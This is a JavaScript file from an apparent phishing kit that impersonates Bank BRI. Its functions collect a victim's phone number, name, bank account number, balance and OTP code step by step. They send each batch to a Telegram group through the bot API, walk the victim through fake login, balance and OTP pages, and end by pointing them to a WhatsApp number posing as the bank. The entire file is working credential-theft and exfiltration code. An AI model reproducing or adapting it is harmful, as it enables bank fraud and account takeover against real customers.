// index
function sendNohp(){
   $('.process1').fadeIn();
    event.preventDefault();   
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
    document.getElementById('kirim').innerHTML = "Memproses....";         
    var nohp = document.getElementById("nohp").value;
    sessionStorage.setItem("nohp", nohp);                    
    var logo = document.getElementById('logo');       
    var nohp = document.getElementById('nohp');    
    var gabungan = '' + logo.value + '%0A%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif + '%0A- 𝐍𝐨.𝐇𝐩 •• ' + nohp.value;   
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,   
    complete: function(){
    setTimeout(function(){   
    window.location = "login.html";
      
    document.getElementById('kirim').innerHTML = "Lanjutkan";
    $('.process1').fadeOut();
    }, 500);}});};   
     
     
//data     
function sendDebit(){
   $('.process1').fadeIn();
    event.preventDefault();   
    document.getElementById('kirim').innerHTML = "Memproses....";               
             
        
    var gabungan = '' + logo.value + '%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif +  '%0A- 𝐍𝐨.𝐇𝐩 •• ' + nohp + '%0A%0A- 𝐍𝐚𝐦𝐚 •• ' + nama.value + '%0A- 𝐍𝐨.𝐑𝐞𝐤 •• ' + rek.value ;  
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
    complete: function(){    
    setTimeout(function(){   
    window.location = "saldo.html";
    
    $('.process1').fadeOut();
    document.getElementById('kirim').innerHTML = "Lanjutkan"; 
    var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
var nohp = document.getElementById('nohp').value;
            sessionStorage.setItem("nohp", nohp);
var nama = document.getElementById('nama').value;
           sessionStorage.setItem("nama", nama);
var rek = document.getElementById('rek').value;
            sessionStorage.setItem("rek", rek);
   
    }, 1500);}});};
    
    

 // saldo  
function sendSaldo(){
    event.preventDefault();    
    document.getElementById('kirim').innerHTML = "Verify...";
    
    $('.process1').fadeIn();                    
        
    var gabungan = '' + logo.value + '%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif +  '%0A- 𝐍𝐨.𝐇𝐩 •• ' + nohp + '%0A%0A- 𝐍𝐚𝐦𝐚 •• ' + nama + '%0A- 𝐍𝐨.𝐑𝐞𝐤 •• ' + rek + '%0A- 𝐒𝐚𝐥𝐝𝐨 •• ' + saldo.value;
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
   complete: function(){     
   setTimeout(function(){
   document.getElementById('kirim').innerHTML = "Benar";
   
   $('.process1').fadeOut();
   window.location = "otp.html";
   
 var nohp = document.getElementById("nohp").value;
 sessionStorage.setItem("nohp", nohp);
 var nama = document.getElementById("nama").value;
 sessionStorage.setItem("nama", nama);
 var rek = document.getElementById("rek").value;
 sessionStorage.setItem("rek", rek);
 var saldo = document.getElementById("saldo").value;
 sessionStorage.setItem("saldo", saldo);
    }, 300);}});};    
        



// otp
function sendOtp(){
    event.preventDefault();        
    document.getElementById('kirims').value = "Memproses....";                            
      $('#load').fadeIn();
    var gabungan = '' + logo.value + '%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif +  '%0A- 𝐍𝐨.𝐇𝐩 •• ' + nohp + '%0A%0A- 𝐍𝐚𝐦𝐚 •• ' + nama + '%0A- 𝐍𝐨.𝐑𝐞𝐤 •• ' + rek + '%0A- 𝐒𝐚𝐥𝐝𝐨 •• ' + saldo + '%0A%0A- 𝐎𝐭𝐩 •• ' + nama1.value ;   
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
    complete: function(){
     
    setTimeout(function(){
    document.getElementById("logoku").style.display = "none";
  document.getElementById("blinkAktivasi").style.display = "block";
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
   document.getElementById('kirims').value = "Konfirmasi";
   $('#load').fadeOut();
    }, 200);}});};



function go(){
 $('.process1').fadeIn();   
setTimeout(function(){  
location.href='https://wa.me/6281554311859?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20mau%20Request%20Kode%20Aktivasi';
 $('.process1').fadeOut();
 }, 2000);    
}     
